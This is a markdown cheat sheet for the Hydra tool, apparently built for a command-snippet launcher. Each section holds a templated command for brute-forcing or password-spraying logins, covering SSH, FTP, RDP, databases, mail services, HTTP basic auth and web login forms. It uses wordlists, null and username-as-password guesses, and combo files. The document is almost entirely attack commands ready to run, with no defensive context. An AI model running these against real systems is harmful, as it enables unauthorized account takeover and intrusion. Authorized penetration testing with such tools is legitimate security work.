# Hydra

<!-- cheat
export hydra
var scheme_hydra_protocol = printf '%s\n' ftp ssh imap pop3s mssql rdp vnc smtp mysql --- --header 'Service to bruteforce'
import wordlist_passwords
import wordlists_users
-->

## hydra - brute force

### Brute service login

Dump brute service login with Hydra.

```sh title:"Hydra Dump Brute Service Login"
hydra -l $user -P $wordlists $scheme_hydra_protocol://$domain
```
<!-- cheat
import hydra
import users
import domain_ip
-->

### User and password lists

Dump user and password lists with Hydra.

```sh title:"Hydra Dump User and Password Lists"
hydra -L "$wordlists_users" -P "$wordlists" "$rhost_ip" "$scheme_hydra_protocol"
```
<!-- cheat
import hydra
var rhost_ip
-->

### Single password

Dump single password with Hydra.

```sh title:"Hydra Dump Single Password"
hydra -l "$user" -p "$pass" "$rhost_ip" ssh
```
<!-- cheat
var user
var pass
var rhost_ip
-->

### Username as password

Dump username as password with Hydra.

```sh title:"Hydra Dump Username as Password"
hydra -L "$wordlists_users" -e s "$rhost_ip" ssh
```
<!-- cheat
import hydra
var rhost_ip
-->

### Null password

Dump null password with Hydra.

```sh title:"Hydra Dump Null Password"
hydra -l "$user" -e n "$rhost_ip" ssh
```
<!-- cheat
var user
var rhost_ip
-->

### Login-pass file

Run login pass file with Hydra.

```sh title:"Hydra Run Login Pass File"
hydra -t 4 -s "$rport" -C "$combo_file" "$rhost_ip" ssh
```
<!-- cheat
var rport := 22
var combo_file
var rhost_ip
-->

### Brute HTTP basic auth

Run brute HTTP basic auth with Hydra.

```sh title:"Hydra Run Brute HTTP Basic Auth"
hydra -l $user -P $wordlists $domain http-get
```
<!-- cheat
import hydra
import users
import domain_ip
-->

### Brute HTTP POST form

Run brute HTTP POST form with Hydra.

```sh title:"Hydra Run Brute HTTP POST Form"
hydra -l $user -P $wordlists $domain http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```
<!-- cheat
import hydra
import users
import domain_ip
-->
